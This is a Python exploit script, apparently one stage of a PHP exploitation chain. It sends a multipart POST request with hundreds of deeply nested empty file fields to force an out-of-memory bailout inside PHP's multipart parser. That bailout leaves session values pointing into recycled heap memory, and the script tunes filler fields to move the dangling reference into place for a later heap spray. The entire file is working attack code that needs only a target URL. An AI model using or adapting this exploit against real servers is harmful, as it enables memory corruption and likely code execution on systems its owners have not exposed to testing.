#!/usr/bin/env python3
# SPDX-License-Identifier: MIT
# Copyright (c) 2026 GG ADVANCED IT Security UG

"""a2_cheap_oom.py - the cheap OOM that leaves the session on a recycled chunk.

The multipart parser walks nested *file* fields whose bodies are empty. Every one of them ends the
part right after the header block, so the parser keeps allocating per-file bookkeeping until the
memory limit trips *inside* the parser, before module RINIT/RINIT shutdown completes. That bailout
skips the module shutdown, so `PS(...)` values keep pointing into memory the engine then recycles -
which is what the later spray writes into.

`--fillers` inserts short one-byte fields before the nested parts; each one shifts the dangling
reference by roughly 0x80 bytes in this build, which is how the two heap slots (hsv and S) are moved
to where the reference layout expects them.

usage:
  a2_cheap_oom.py --url http://127.0.0.1:18110/index.php --parts 880 --depth 64 --fillers 115
"""
import argparse
import socket

BOUNDARY = b"C" * 10


def nested_name(index, depth, pad=0):
    """files[R00000[K*pad]][a][a]... - a depth-deep nested key, so the parser builds arrays."""
    if depth < 2:
        raise ValueError("depth must be >= 2")
    return ("files[R%05d%s]" % (index, "K" * pad)).encode() + b"[a]" * (depth - 2)


def build(parts, depth, fillers, sid, progress, boundary=BOUNDARY, pad=0):
    out = bytearray()

    def field(name, value=b""):
        out.extend(b"--" + boundary + b"\r\nContent-Disposition: form-data; name=\""
                   + name + b"\"\r\n\r\n" + value + b"\r\n")

    field(b"PHPSESSID", sid)
    field(b"PHP_SESSION_UPLOAD_PROGRESS", progress)
    for i in range(fillers):
        field(("%03d" % i).encode(), b"x")
    for i in range(parts):
        # Empty file part: header block, then the next boundary immediately, so no body is read.
        out.extend(b"--" + boundary + b"\r\nContent-Disposition: form-data; name=\""
                   + nested_name(i, depth, pad)
                   + b"\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n")
    out.extend(b"--" + boundary + b"--\r\n")
    return bytes(out)


def send(host, port, path, body, timeout):
    request = ("POST %s HTTP/1.1\r\nHost: %s:%d\r\n"
               "Content-Type: multipart/form-data; boundary=%s\r\n"
               "Content-Length: %d\r\nConnection: close\r\n\r\n"
               % (path, host, port, BOUNDARY.decode(), len(body))).encode()
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
    except OSError as exc:
        return b"", "no target on %s:%d (%s)" % (host, port, exc.strerror or exc)
    response = bytearray()
    try:
        sock.settimeout(timeout)
        sock.sendall(request + body)
        while True:
            chunk = sock.recv(65536)
            if not chunk:
                break
            response.extend(chunk)
    except OSError:
        pass
    finally:
        sock.close()
    return bytes(response), None


def main():
    ap = argparse.ArgumentParser(description="cheap-OOM arming request for the execution stage")
    ap.add_argument("--url", default="http://127.0.0.1:18110/index.php")
    ap.add_argument("--parts", type=int, default=880)
    ap.add_argument("--depth", type=int, default=64)
    ap.add_argument("--fillers", type=int, default=115)
    ap.add_argument("--sid", default="a" * 32)
    ap.add_argument("--progress", default="k0")
    ap.add_argument("--key-pad", type=int, default=0)
    ap.add_argument("--timeout", type=float, default=120.0)
    args = ap.parse_args()

    hostport = args.url.split("://", 1)[-1]
    hostport, _, path = hostport.partition("/")
    host, _, port = hostport.partition(":")
    body = build(args.parts, args.depth, args.fillers, args.sid.encode(),
                 args.progress.encode(), pad=args.key_pad)
    response, error = send(host, int(port or 80), "/" + path, body, args.timeout)
    status = response.split(b"\r\n", 1)[0][:40].decode("latin1", "replace") if response else ""
    print("a2 parts=%d depth=%d fillers=%d body=%d response=%d %s%s"
          % (args.parts, args.depth, args.fillers, len(body), len(response), status,
             "  [socket %s]" % error if error else ""))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
